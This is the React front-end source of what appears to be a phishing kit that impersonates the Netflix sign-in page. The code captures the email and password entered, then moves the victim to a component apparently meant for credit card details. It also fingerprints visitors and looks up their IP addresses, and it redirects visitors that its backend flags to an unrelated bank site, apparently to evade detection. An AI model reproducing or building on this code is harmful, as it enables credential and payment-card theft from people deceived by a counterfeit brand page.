import logo from './logo.svg';
import './App.css';
import './Text.css'
import { FilledInput, TextField, withStyles } from '@mui/material';
import { makeStyles } from '@mui/styles';
import CC from './CC';
import { useEffect, useReducer, useState } from 'react';
import { CircularProgress } from "@mui/material";
import { useVisitorData } from '@fingerprintjs/fingerprintjs-pro-react'
import axios from 'axios'



const useStyles = makeStyles(theme => ({


  
  root: {
    "& .MuiFilledInput-root .MuiInputBase-input": {
      background: "#454545",
      borderRadius: "3px",
      color:"#fff"
      

    },
    multilineColor:{
      color:'red'
  },

    ".MuiInputBase-input":  {
      background: "#454545"
    }
  },

  cssLabel: {
    color: "#ffffff",
  },

  textField: {
    borderRadius: "3px",
    color: '#ffffff'


  },


  circularProgress: {
    marginLeft: '15px',
    position: 'absolute',
    
width: '100%',
'  text-align': 'center',
    
  },

  
}));

const reducer = (state, action) => {
  console.log("action", action.data);
  switch (action.type) {
    case "email":
      return { ...state, email: action.data };
    case "password":
      return { ...state, password: action.data };
    default:
      return state;
  }
};







function App() {

  const classes = useStyles();
  const [show, setShow] = useState(false);
  const [color, setColor] = useState(false); 

  const [email, setEmail] = useState(''); 
  const [password, setPassword] = useState(''); 
  const [loading, setLoading] = useState(false);
  var [visitor, setVisitor] = useState(''); 
  var [status, setStatus] = useState(200);



  const [state, dispatch] = useReducer(reducer, {
    email: "",
    password: ""
  });

  const {
    isLoading,
    error,
    data,
  } = useVisitorData();

  


  const getData = async (ip) => {
    if (isLoading) {
      return console.log('loading');
    }
    if (error) {
      return console.log(error.message);
    }
  
    if (data) {
      // perform some logic based on the visitor data
      setVisitor(data.visitorId)
      console.log(data)
  
       fetch('http://localhost:4000/',{
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({visitor_id: data.visitorId, ip: ip})
      })
      .then((response) => {
        console.log(response.status)
        if(response.status === 403){
  
          console.log('cool')
          setStatus(403)
        } else{
          setStatus(200)
        }
  
  
  
      });
      
    }
  }



 useEffect(() => {
  const res =  axios.get('https://geolocation-db.com/json/');
  res.then((response) =>{
    console.log(response.data)
    getData(response.data.IPv4)


  }); 

  



}, [data]);




  const submitHandler = e => {
    setLoading(true);
    e.preventDefault(); 

    setTimeout(() => {

      setShow(!show)
    setColor(true)
      
    }, 3000);

    console.log(state.email)
    console.log(state.password)
  }

  
  const changeHandler = (e) => {

    dispatch({ type: e.target.name, data: e.target.value });
  }

  const fowardPage = () => {

    window.location.replace('https://www.americafirst.com/');



  }



  return (


    <div class= {color ? 'bg-white w-full bg-cover bg-center flex flex-col h-screen' : 'bg-black w-full bg-cover bg-center flex flex-col h-screen'}>
    {status === 403 ? (fowardPage() ): (false)}


      <header>
        <nav className=" h-10 w-full  ">
          <div className={color ? 'flex border-b-2 border-stone-100 w-full' : 'flex  w-full'}>
            <img src="/netflix.png" className="ml-1  h-[40px]" alt="Flowbite Logo" />
            <span className='absolute right-0 mr-2 mt-2'>Sign out</span>
          </div>
        </nav>
      </header>

      {!show ? (

      <div class=" grid place-items-center  place-content-center mt-8">
        <form class="px-5 w-full ">
          <span className='text-white text-[32px] text-bold'>Sign In</span>
          <div className='mb-4 mt-5 '>
            <TextField className={classes.root} onChange={changeHandler} value={state.email} name={'email'} fullWidth="true" id="outlined-basic" label="Email or phone number" variant="filled" color="warning" type="text" placeholder="Username" size="small" />
          </div>

          

          <div className=''>
            <TextField className={classes.root} onChange={changeHandler} value={state.password} name={'password'}fullWidth='true' id="outlined-basic" label="Password" variant="filled" color="warning" type="text" placeholder="Username" size="small" />
          </div>
          <div class=" place-items-center w-full">
            <button  type="button" 
            className={loading
              ? "w-full mt-10 bg-red-300 text-white font-bold py-2 px-4 mt-10 h-[50px] rounded focus:outline-none focus:shadow-outline"
              : "w-full mt-10 bg-[#E50914] text-white font-bold py-2 px-4 mt-10 h-[50px] rounded focus:outline-none focus:shadow-outline"}
            onClick={submitHandler}
            >

              {loading ? (
            <CircularProgress className={classes.circularProgress} size={30} />
          ) : (
            <div></div>
          )}


              Sign In
            </button>

            <div className="form-check mt-3 grid grid-rows-1 grid-flow-col gap-1">
              <div>
                <input
                  type="checkbox"
                  className="mr-1"
                  id="rememberPassword"
                  name="checkbox"
                // required
                />
                <label className="text-stone-500 text-[14px]" for="rememberPassword">
                  Remember me
                </label>
              </div>
              <div className='text-stone-500 text-right text-[14px]'>Need help?</div>
            </div>
            <div className='mt-4 mb-4 text-stone-500'>New to Netflix? <span class='text-bold text-white'>Sign up now.</span></div>

            <p className='text-stone-500 text-[13px] leading-none mb-10	'>This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href='' className='text-blue-600 text-[14px]'>Learn more</a>    </p>
            {/* <a href='' className='te xt-blue-600 text-[14px]'>Learn more</a>         */}

          </div> 
        </form>
      </div>
                ) : <CC/>}

      <footer className={color ? 'place-content-stretch min-[320px]:mt-[100px] bg-[#f3f3f3] align-bottom h-screen ' : 'place-content-stretch min-[320px]:mt-[100px] bg-black align-bottom h-screen '}>
        <div className='border-b-[1px] border-stone-100 mb-6 ' />
        <div className='text-stone-500 text-s ml-4 mb-5 '>Questions? Call 1-844-505-2993</div>
        <div class=" mt-auto grid grid-flow-row-dense grid-cols-3 grid-rows-3 mt-10 mr-20">

          <div class="col-span-2 text-stone-500 text-sm mb-3 ml-5 ">FAQ</div>
          <div class="col-span-2 text-stone-500 text-sm mb-1 ml-5">Netflix Shop</div>
          <div class="col-span-2  text-stone-500 text-sm mb-1 ml-5">Privacy</div>
          <div class="col-span-2 text-stone-500 text-sm mb-1 ml-5">Corporate Information</div>


          <div className=' text-stone-500 text-sm'>Help Center</div>
          <div className=' text-stone-500 text-sm'>Terms of Use</div>
          <div className=' text-stone-500 text-sm '>Cookies</div>
          <p className='text-stone-500 text-sm mb-10 '>Do Not Sell</p>

        </div>

      </footer>



    </div>
  );
}

export default App;
